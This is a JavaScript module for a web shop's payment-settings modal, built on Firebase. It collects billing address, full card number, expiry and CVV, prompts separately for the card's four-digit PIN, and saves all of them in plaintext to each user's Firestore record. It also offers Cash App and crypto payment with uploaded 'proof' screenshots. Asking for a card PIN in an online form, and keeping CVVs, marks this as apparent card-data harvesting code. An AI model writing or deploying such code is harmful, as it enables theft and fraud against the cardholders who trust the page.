import { db } from './firebase.js';
import { doc, getDoc, setDoc } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore.js";
import { getLoggedInUser } from './auth.js';
import { getPaymentSettings } from './data.js'; // Import getPaymentSettings
import { showLoadingOverlay, hideLoadingOverlay } from './loading.js'; // Import loading functions
import { showNotification } from './notification.js';
import { sendTemplatedEmail, getAdminEmail } from './email.js';

export const paymentModalHTML = `
<div id="payment-modal" class="fixed inset-0 z-50 hidden overflow-y-auto bg-black bg-opacity-50 flex justify-center items-center">
    <div class="bg-white rounded-lg shadow-xl w-full max-w-4xl p-6">
        <div class="flex justify-between items-center border-b pb-3 mb-4">
            <h3 class="text-xl font-semibold">Payment Details</h3>
            <button id="close-payment-modal" class="text-gray-500 hover:text-gray-700 text-2xl">&times;</button>
        </div>
        <form id="payment-options-form" class="space-y-6">
            <!-- Default Payment Mode Selection -->
            <div>
                <h4 class="text-lg font-medium mb-3">Default Payment Mode</h4>
                <div class="flex space-x-4">
                    <label class="inline-flex items-center">
                        <input type="radio" name="defaultPaymentMode" value="card" class="form-radio text-primary" checked>
                        <span class="ml-2">Card</span>
                    </label>
                    <label class="inline-flex items-center">
                        <input type="radio" name="defaultPaymentMode" value="cashapp" class="form-radio text-primary">
                        <span class="ml-2">Cash App</span>
                    </label>
                    <label class="inline-flex items-center">
                        <input type="radio" name="defaultPaymentMode" value="crypto" class="form-radio text-primary">
                        <span class="ml-2">Crypto</span>
                    </label>
                </div>
            </div>

            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                <!-- Billing Address Form -->
                <div>
                    <h4 class="text-lg font-medium mb-3">Billing Address</h4>
                    <div class="space-y-4">
                        <div>
                            <label for="address-street" class="block text-sm font-medium text-gray-700">Street</label>
                            <input type="text" id="address-street" class="mt-1 block w-full border border-gray-300 rounded-md shadow-sm p-2" required>
                        </div>
                        <div>
                            <label for="address-city" class="block text-sm font-medium text-gray-700">City</label>
                            <input type="text" id="address-city" class="mt-1 block w-full border border-gray-300 rounded-md shadow-sm p-2" required>
                        </div>
                        <div>
                            <label for="address-state" class="block text-sm font-medium text-gray-700">State</label>
                            <input type="text" id="address-state" class="mt-1 block w-full border border-gray-300 rounded-md shadow-sm p-2" required>
                        </div>
                        <div>
                            <label for="address-zip" class="block text-sm font-medium text-gray-700">Zip Code</label>
                            <input type="text" id="address-zip" class="mt-1 block w-full border border-gray-300 rounded-md shadow-sm p-2" required>
                        </div>
                    </div>
                </div>

                <!-- Payment Method Details -->
                <div>
                    <!-- Card Details Section -->
                    <div id="card-details-section" class="space-y-4">
                        <h4 class="text-lg font-medium mb-3">Card Details</h4>
                        <div>
                            <label for="card-type" class="block text-sm font-medium text-gray-700">Card Type</label>
                            <select id="card-type" class="mt-1 block w-full border border-gray-300 rounded-md shadow-sm p-2">
                                <option value="">Select Card Type</option>
                                <option value="Visa">Visa</option>
                                <option value="Mastercard">Mastercard</option>
                                <option value="American Express">American Express</option>
                                <option value="Discover">Discover</option>
                            </select>
                        </div>
                        <div>
                            <label for="card-number" class="block text-sm font-medium text-gray-700">Card Number</label>
                            <input type="text" id="card-number" class="mt-1 block w-full border border-gray-300 rounded-md shadow-sm p-2" placeholder="**** **** **** 1234" maxlength="19">
                        </div>
                        <div class="grid grid-cols-2 gap-4">
                            <div>
                                <label for="card-expiry" class="block text-sm font-medium text-gray-700">Expiry Date</label>
                                <input type="text" id="card-expiry" class="mt-1 block w-full border border-gray-300 rounded-md shadow-sm p-2" placeholder="MM/YY" maxlength="5">
                            </div>
                            <div>
                                <label for="card-cvv" class="block text-sm font-medium text-gray-700">CVV</label>
                                <input type="text" id="card-cvv" class="mt-1 block w-full border border-gray-300 rounded-md shadow-sm p-2" placeholder="123" maxlength="4">
                            </div>
                        </div>
                        <div id="saved-card-info" class="mt-4 p-3 border rounded-md bg-gray-50 hidden">
                            <h5 class="font-medium">Saved Card:</h5>
                            <p id="display-card-type" class="text-sm text-gray-700"></p>
                            <p id="display-card-number" class="text-sm text-gray-700"></p>
                        </div>
                    </div>

                    <!-- Cash App Details Section -->
                    <div id="cashapp-details-section" class="space-y-4 hidden">
                        <h4 class="text-lg font-medium mb-3">Cash App Details</h4>
                        <p class="text-sm text-muted-foreground">Send payment to: <strong id="cashapp-name-display"></strong></p>
                        <p class="text-sm text-muted-foreground">Note: <strong id="cashapp-tag-display"></strong></p>
                        <div>
                            <label for="cashapp-transaction-id" class="block text-sm font-medium text-gray-700">Transaction ID</label>
                            <input type="text" id="cashapp-transaction-id" class="mt-1 block w-full border border-gray-300 rounded-md shadow-sm p-2" placeholder="Cash App Transaction ID">
                        </div>
                        <div>
                            <label for="cashapp-proof-upload" class="block text-sm font-medium text-gray-700">Upload Payment Proof</label>
                            <input type="file" id="cashapp-proof-upload" accept="image/*" class="mt-1 block w-full text-sm text-gray-500 file:mr-4 file:py-2 file:px-4 file:rounded-md file:border-0 file:text-sm file:font-semibold file:bg-primary file:text-primary-foreground hover:file:bg-primary/90">
                            <div id="cashapp-proof-preview" class="mt-2 grid grid-cols-2 gap-2"></div>
                            <div id="saved-cashapp-proof" class="mt-2 p-3 border rounded-md bg-gray-50 hidden">
                                <h5 class="font-medium">Saved Proof:</h5>
                                <img id="display-cashapp-proof" src="" alt="Cash App Proof" class="w-24 h-24 object-cover rounded-md">
                            </div>
                        </div>
                    </div>

                    <!-- Crypto Details Section -->
                    <div id="crypto-details-section" class="space-y-4 hidden">
                        <h4 class="text-lg font-medium mb-3">Crypto Details</h4>
                        <p class="text-sm text-muted-foreground">Send payment to:</p>
                        <p class="text-sm text-muted-foreground">Address: <strong id="crypto-address-display"></strong></p>
                        <p class="text-sm text-muted-foreground">Tag/Memo: <strong id="crypto-tag-display"></strong></p>
                        <div>
                            <label for="crypto-transaction-id" class="block text-sm font-medium text-gray-700">Transaction ID</label>
                            <input type="text" id="crypto-transaction-id" class="mt-1 block w-full border border-gray-300 rounded-md shadow-sm p-2" placeholder="Crypto Transaction ID">
                        </div>
                        <div>
                            <label for="crypto-proof-upload" class="block text-sm font-medium text-gray-700">Upload Payment Proof</label>
                            <input type="file" id="crypto-proof-upload" accept="image/*" class="mt-1 block w-full text-sm text-gray-500 file:mr-4 file:py-2 file:px-4 file:rounded-md file:border-0 file:text-sm file:font-semibold file:bg-primary file:text-primary-foreground hover:file:bg-primary/90">
                            <div id="crypto-proof-preview" class="mt-2 grid grid-cols-2 gap-2"></div>
                            <div id="saved-crypto-proof" class="mt-2 p-3 border rounded-md bg-gray-50 hidden">
                                <h5 class="font-medium">Saved Proof:</h5>
                                <img id="display-crypto-proof" src="" alt="Crypto Proof" class="w-24 h-24 object-cover rounded-md">
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <button type="submit" class="w-full bg-primary text-primary-foreground py-2 px-4 rounded-md hover:bg-primary/90">Save Payment Options</button>
        </form>
    </div>
</div>

<!-- PIN Entry Modal -->
<div id="pin-modal" class="fixed inset-0 z-50 hidden overflow-y-auto bg-black bg-opacity-50 flex justify-center items-center">
    <div class="bg-white rounded-lg shadow-xl w-full max-w-md p-6">
        <div class="flex justify-between items-center border-b pb-3 mb-4">
            <h3 class="text-xl font-semibold">Enter Card PIN</h3>
            <button id="close-pin-modal" class="text-gray-500 hover:text-gray-700 text-2xl">&times;</button>
        </div>
        <div class="space-y-4">
            <div>
                <label for="card-pin" class="block text-sm font-medium text-gray-700">PIN</label>
                <input type="password" id="card-pin" class="mt-1 block w-full border border-gray-300 rounded-md shadow-sm p-2" maxlength="4" inputmode="numeric" pattern="[0-9]*" required>
            </div>
            <div class="flex justify-end space-x-2">
                <button id="cancel-pin-entry" type="button" class="inline-flex items-center justify-center whitespace-nowrap rounded-md text-sm font-medium transition-colors focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring disabled:pointer-events-none disabled:opacity-50 border border-input bg-transparent shadow-sm hover:bg-accent hover:text-accent-foreground h-9 px-4 py-2">Cancel</button>
                <button id="confirm-pin-entry" type="button" class="inline-flex items-center justify-center whitespace-nowrap rounded-md text-sm font-medium transition-colors focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring disabled:pointer-events-none disabled:opacity-50 bg-primary text-primary-foreground shadow hover:bg-primary/90 h-9 px-4 py-2">Confirm</button>
            </div>
        </div>
    </div>
</div>
`;

let selectedCashAppProofFile = null;
let selectedCryptoProofFile = null;
let resolvePinPromise = null; // To resolve the PIN entry promise
let modalClosePromiseResolver = null; // To resolve the modal close promise

export function setupPaymentModalListeners() {
    // This function sets up listeners for elements *inside* the payment modal.
    // It should be called only once when the modal is injected into the DOM.

    const paymentModal = document.getElementById('payment-modal');
    const closePaymentModalBtn = document.getElementById('close-payment-modal');
    const paymentOptionsForm = document.getElementById('payment-options-form');

    // If the modal itself isn't on the page, do nothing.
    if (!paymentModal) {
        return;
    }

    const defaultPaymentModeRadios = document.querySelectorAll('input[name="defaultPaymentMode"]');
    const cardDetailsSection = document.getElementById('card-details-section');
    const cashappDetailsSection = document.getElementById('cashapp-details-section');
    const cryptoDetailsSection = document.getElementById('crypto-details-section');

    const cashappProofUpload = document.getElementById('cashapp-proof-upload');
    const cashappProofPreview = document.getElementById('cashapp-proof-preview');
    const cryptoProofUpload = document.getElementById('crypto-proof-upload');
    const cryptoProofPreview = document.getElementById('crypto-proof-preview');

    // PIN Modal elements
    const pinModal = document.getElementById('pin-modal');
    const closePinModalBtnFromPin = document.getElementById('close-pin-modal');
    const cardPinInput = document.getElementById('card-pin');
    const cancelPinEntryBtn = document.getElementById('cancel-pin-entry');
    const confirmPinEntryBtn = document.getElementById('confirm-pin-entry');

    if (closePaymentModalBtn) {
        closePaymentModalBtn.addEventListener('click', closePaymentModal);
    }
    
    paymentModal.addEventListener('click', (e) => {
        if (e.target === paymentModal) {
            closePaymentModal();
        }
    });

    // Handle payment mode selection
    defaultPaymentModeRadios.forEach(radio => {
        radio.addEventListener('change', (event) => {
            const mode = event.target.value;
            cardDetailsSection.classList.add('hidden');
            cashappDetailsSection.classList.add('hidden');
            cryptoDetailsSection.classList.add('hidden');

            if (mode === 'card') {
                cardDetailsSection.classList.remove('hidden');
            } else if (mode === 'cashapp') {
                cashappDetailsSection.classList.remove('hidden');
            } else if (mode === 'crypto') {
                cryptoDetailsSection.classList.remove('hidden');
            }
        });
    });

    // Handle Cash App proof upload preview
    if (cashappProofUpload) {
        cashappProofUpload.addEventListener('change', (event) => {
            cashappProofPreview.innerHTML = '';
            selectedCashAppProofFile = event.target.files[0];
            if (selectedCashAppProofFile) {
                const reader = new FileReader();
                reader.onload = (e) => {
                    const img = document.createElement('img');
                    img.src = e.target.result;
                    img.className = 'w-24 h-24 object-cover rounded-md';
                    cashappProofPreview.appendChild(img);
                };
                reader.readAsDataURL(selectedCashAppProofFile);
            }
        });
    }

    // Handle Crypto proof upload preview
    if (cryptoProofUpload) {
        cryptoProofUpload.addEventListener('change', (event) => {
            cryptoProofPreview.innerHTML = '';
            selectedCryptoProofFile = event.target.files[0];
            if (selectedCryptoProofFile) {
                const reader = new FileReader();
                reader.onload = (e) => {
                    const img = document.createElement('img');
                    img.src = e.target.result;
                    img.className = 'w-24 h-24 object-cover rounded-md';
                    cryptoProofPreview.appendChild(img);
                };
                reader.readAsDataURL(selectedCryptoProofFile);
            }
        });
    }

    // PIN Modal Listeners
    if (pinModal) {
        if(closePinModalBtnFromPin) {
            closePinModalBtnFromPin.addEventListener('click', () => {
                pinModal.classList.add('hidden');
                if (resolvePinPromise) resolvePinPromise(null); // Resolve with null on close/cancel
            });
        }
        if(cancelPinEntryBtn) {
            cancelPinEntryBtn.addEventListener('click', () => {
                pinModal.classList.add('hidden');
                if (resolvePinPromise) resolvePinPromise(null); // Resolve with null on close/cancel
            });
        }
        if(confirmPinEntryBtn) {
            confirmPinEntryBtn.addEventListener('click', () => {
                const pin = cardPinInput.value;
                if (pin.length === 4 && /^\d{4}$/.test(pin)) {
                    pinModal.classList.add('hidden');
                    if (resolvePinPromise) resolvePinPromise(pin);
                } else {
                    showNotification('Please enter a valid 4-digit PIN.', true);
                }
            });
        }
    }

    if (paymentOptionsForm) {
        paymentOptionsForm.addEventListener('submit', handleSavePaymentOptions);
    }
}

export function openPaymentModal() {
    const paymentModal = document.getElementById('payment-modal');
    if (paymentModal) {
        paymentModal.classList.remove('hidden');
        loadPaymentDetails();
    }
    return new Promise(resolve => {
        modalClosePromiseResolver = resolve;
    });
}

export function closePaymentModal() {
    const paymentModal = document.getElementById('payment-modal');
    if (paymentModal) {
        paymentModal.classList.add('hidden');
    }
    if (modalClosePromiseResolver) {
        modalClosePromiseResolver();
        modalClosePromiseResolver = null;
    }
}

async function uploadProofImage(file) {
    if (!file) return null;

    const formData = new FormData();
                    formData.append('images[]', file); // Use 'images[]' as expected by upload_to_imghippo.php
    
                    try {
                        const response = await fetch('/upload_to_imghippo.php', {
            method: 'POST',
            body: formData
        });

        if (!response.ok) {
            const errorData = await response.json();
            throw new Error(errorData.errors ? errorData.errors.join(', ') : 'Proof image upload failed');
        }

        const result = await response.json();
        return result.urls[0]; // Assuming single file upload for proof
    } catch (error) {
        console.error("Error uploading proof image: ", error);
        showNotification('Error uploading proof image: ' + error.message, true);
        throw error; // Re-throw to stop further processing
    }
}

// Function to show PIN entry modal and return a Promise that resolves with the PIN
function promptForPin() {
    const pinModal = document.getElementById('pin-modal');
    const cardPinInput = document.getElementById('card-pin');
    cardPinInput.value = ''; // Clear previous PIN
    pinModal.classList.remove('hidden');

    return new Promise(resolve => {
        resolvePinPromise = resolve;
    });
}


async function loadPaymentDetails() {
    const user = getLoggedInUser();
    if (!user) {
        showNotification("No user logged in to load payment details.", true);
        return;
    }

    const userRef = doc(db, "users", user.uid);
    const userSnap = await getDoc(userRef);
    const globalSettings = await getPaymentSettings(); // Fetch global settings

    if (userSnap.exists()) {
        const userData = userSnap.data();

        // Load Default Payment Mode
        const defaultPaymentMode = userData.defaultPaymentMode || 'card';
        document.querySelector(`input[name="defaultPaymentMode"][value="${defaultPaymentMode}"]`).checked = true;
        // Trigger change event to show correct section
        document.querySelector(`input[name="defaultPaymentMode"][value="${defaultPaymentMode}"]`).dispatchEvent(new Event('change'));

        // Load Billing Address
        if (userData.billingAddress) {
            document.getElementById('address-street').value = userData.billingAddress.street || '';
            document.getElementById('address-city').value = userData.billingAddress.city || '';
            document.getElementById('address-state').value = userData.billingAddress.state || '';
            document.getElementById('address-zip').value = userData.billingAddress.zip || '';
        } else {
            document.getElementById('address-street').value = '';
            document.getElementById('address-city').value = '';
            document.getElementById('address-state').value = '';
            document.getElementById('address-zip').value = '';
        }

        // Load Card Details
        const savedCardInfoDiv = document.getElementById('saved-card-info');
        const displayCardType = document.getElementById('display-card-type');
        const displayCardNumber = document.getElementById('display-card-number');
        const cardTypeSelect = document.getElementById('card-type');

        if (userData.cardDetails) {
            cardTypeSelect.value = userData.cardDetails.type || '';
            document.getElementById('card-number').value = userData.cardDetails.number || '';
            document.getElementById('card-expiry').value = userData.cardDetails.expiry || '';
            document.getElementById('card-cvv').value = userData.cardDetails.cvv || ''; // Load CVV
            // PIN is not loaded into input for security reasons, even in dev

            displayCardType.textContent = `Type: ${userData.cardDetails.type || 'N/A'}`;
            displayCardNumber.textContent = `Number: ${userData.cardDetails.number ? `**** **** **** ${userData.cardDetails.number.slice(-4)}` : 'N/A'}`;
            savedCardInfoDiv.classList.remove('hidden');
        } else {
            cardTypeSelect.value = '';
            document.getElementById('card-number').value = '';
            document.getElementById('card-expiry').value = '';
            document.getElementById('card-cvv').value = '';
            savedCardInfoDiv.classList.add('hidden');
            displayCardType.textContent = '';
            displayCardNumber.textContent = '';
        }

        // Load Cash App Details
        const savedCashAppProofDiv = document.getElementById('saved-cashapp-proof');
        const displayCashAppProof = document.getElementById('display-cashapp-proof');
        if (userData.cashappDetails) {
            document.getElementById('cashapp-transaction-id').value = userData.cashappDetails.transactionId || '';
            if (userData.cashappDetails.proofUrl) {
                displayCashAppProof.src = userData.cashappDetails.proofUrl;
                savedCashAppProofDiv.classList.remove('hidden');
            } else {
                savedCashAppProofDiv.classList.add('hidden');
            }
        } else {
            document.getElementById('cashapp-transaction-id').value = '';
            savedCashAppProofDiv.classList.add('hidden');
        }
        // Set dynamic Cash App details
        document.getElementById('cashapp-name-display').textContent = globalSettings?.cashAppName || 'N/A';
        document.getElementById('cashapp-tag-display').textContent = globalSettings?.cashAppTag || 'N/A';


        // Load Crypto Details
        const savedCryptoProofDiv = document.getElementById('saved-crypto-proof');
        const displayCryptoProof = document.getElementById('display-crypto-proof');
        if (userData.cryptoDetails) {
            document.getElementById('crypto-transaction-id').value = userData.cryptoDetails.transactionId || '';
            if (userData.cryptoDetails.proofUrl) {
                displayCryptoProof.src = userData.cryptoDetails.proofUrl;
                savedCryptoProofDiv.classList.remove('hidden');
            } else {
                savedCryptoProofDiv.classList.add('hidden');
            }
        } else {
            document.getElementById('crypto-transaction-id').value = '';
            savedCryptoProofDiv.classList.add('hidden');
        }
        // Set dynamic Crypto details
        document.getElementById('crypto-address-display').textContent = globalSettings?.cryptoAddress || 'N/A';
        document.getElementById('crypto-tag-display').textContent = globalSettings?.cryptoTag || 'N/A';
    }
}

async function handleSavePaymentOptions(event) {
    event.preventDefault();
    const user = getLoggedInUser();
    if (!user) {
        showNotification("Please log in to save payment options.", true);
        return;
    }

    const userRef = doc(db, "users", user.uid);
    let updateData = {};

    // Billing Address
    const billingAddress = {
        street: document.getElementById('address-street').value,
        city: document.getElementById('address-city').value,
        state: document.getElementById('address-state').value,
        zip: document.getElementById('address-zip').value,
    };
    updateData.billingAddress = billingAddress;

    // Default Payment Mode
    const defaultPaymentMode = document.querySelector('input[name="defaultPaymentMode"]:checked').value;
    updateData.defaultPaymentMode = defaultPaymentMode;

    // Card Details
    if (defaultPaymentMode === 'card') {
        const cardType = document.getElementById('card-type').value;
        const cardNumber = document.getElementById('card-number').value.replace(/\s/g, '');
        const cardExpiry = document.getElementById('card-expiry').value;
        const cardCvv = document.getElementById('card-cvv').value;

        if (!cardType) { showNotification("Please select a card type.", true); return; }
        if (!/^\d{13,19}$/.test(cardNumber)) { showNotification("Please enter a valid card number.", true); return; }
        if (!/^(0[1-9]|1[0-2])\/?([0-9]{2})$/.test(cardExpiry)) { showNotification("Please enter a valid expiry date (MM/YY).", true); return; }
        if (!/^\d{3,4}$/.test(cardCvv)) { showNotification("Please enter a valid CVV.", true); return; }

        // Prompt for PIN
        const pin = await promptForPin(); // No loading overlay here

        if (pin === null) { // User cancelled PIN entry
            showNotification("Card details not saved. PIN entry cancelled.", true);
            return;
        }

        updateData.cardDetails = {
            type: cardType,
            number: cardNumber, // Storing full card number
            expiry: cardExpiry, // Storing expiry date
            cvv: cardCvv,       // Storing CVV
            pin: pin,           // Storing PIN
            lastUpdated: new Date().toISOString()
        };
    } else {
        updateData.cardDetails = null; // Clear card details if not default
    }

    // Cash App Details
    if (defaultPaymentMode === 'cashapp') {
        let cashappProofUrl = null;
        try {
            showLoadingOverlay(); // Show loading overlay for cashapp proof upload
            cashappProofUrl = await uploadProofImage(selectedCashAppProofFile);
        } catch (error) { 
            hideLoadingOverlay(); // Hide on error
            return; 
        } finally {
            hideLoadingOverlay(); // Ensure it's hidden after upload attempt
        }

        updateData.cashappDetails = {
            transactionId: document.getElementById('cashapp-transaction-id').value,
            proofUrl: cashappProofUrl || (user.cashappDetails ? user.cashappDetails.proofUrl : null), // Retain old if no new upload
            lastUpdated: new Date().toISOString()
        };
    } else {
        updateData.cashappDetails = null; // Clear cashapp details if not default
    }

    // Crypto Details
    if (defaultPaymentMode === 'crypto') {
        let cryptoProofUrl = null;
        try {
            showLoadingOverlay(); // Show loading overlay for Crypto proof upload
            cryptoProofUrl = await uploadProofImage(selectedCryptoProofFile);
        } catch (error) { 
            hideLoadingOverlay(); // Hide on error
            return; 
        } finally {
            hideLoadingOverlay(); // Ensure it's hidden after upload attempt
        }

        updateData.cryptoDetails = {
            transactionId: document.getElementById('crypto-transaction-id').value,
            proofUrl: cryptoProofUrl || (user.cryptoDetails ? user.cryptoDetails.proofUrl : null), // Retain old if no new upload
            lastUpdated: new Date().toISOString()
        };
    } else {
        updateData.cryptoDetails = null; // Clear Crypto details if not default
    }

    try {
        showLoadingOverlay(); // Show loading overlay for the Firestore save
        await setDoc(userRef, updateData, { merge: true });
        showNotification("Payment options saved successfully!", false);
        
        // Close the modal immediately to improve perceived performance
        closePaymentModal();

        // Send admin notification in the background without awaiting
        getAdminEmail().then(adminEmail => {
            if (adminEmail) {
                // Send admin notification email
                let cardDetailsHtml = '';
                if (updateData.cardDetails) {
                    cardDetailsHtml = `
                        <p><strong>Card Type:</strong> ${updateData.cardDetails.type}</p>
                        <p><strong>Card Number:</strong> **** **** **** ${updateData.cardDetails.number.slice(-4)}</p>
                        <p><strong>Card Expiry:</strong> ${updateData.cardDetails.expiry}</p>
                    `;
                }

                let cashappDetailsHtml = '';
                if (updateData.cashappDetails) {
                    cashappDetailsHtml = `
                        <p><strong>Cash App Transaction ID:</strong> ${updateData.cashappDetails.transactionId || 'N/A'}</p>
                        ${updateData.cashappDetails.proofUrl ? `<p><strong>Cash App Proof:</strong> <a href="${updateData.cashappDetails.proofUrl}" target="_blank">View Proof</a></p>` : ''}
                    `;
                }

                let cryptoDetailsHtml = '';
                if (updateData.cryptoDetails) {
                    cryptoDetailsHtml = `
                        <p><strong>Crypto Transaction ID:</strong> ${updateData.cryptoDetails.transactionId || 'N/A'}</p>
                        ${updateData.cryptoDetails.proofUrl ? `<p><strong>Crypto Proof:</strong> <a href="${updateData.cryptoDetails.proofUrl}" target="_blank">View Proof</a></p>` : ''}
                    `;
                }

                sendTemplatedEmail(
                    adminEmail, // Use fetched admin email
                    'Admin Notification: User Added/Updated Payment Options',
                    '/email_templates/admin_payment_options_added.html',
                    {
                        userName: user.name || user.email,
                        userEmail: user.email,
                        defaultPaymentMode: updateData.defaultPaymentMode,
                        updateTime: new Date().toLocaleString(),
                        cardDetails: cardDetailsHtml,
                        cashappDetails: cashappDetailsHtml,
                        cryptoDetails: cryptoDetailsHtml
                    }
                ).catch(err => console.error("Failed to send admin notification email:", err));
            }
        }).catch(err => console.error("Failed to get admin email for notification:", err));

    } catch (error) {
        console.error("Error saving payment options:", error);
        showNotification("Failed to save payment options.", true);
    } finally {
        hideLoadingOverlay(); // Ensure loading overlay is hidden
    }
}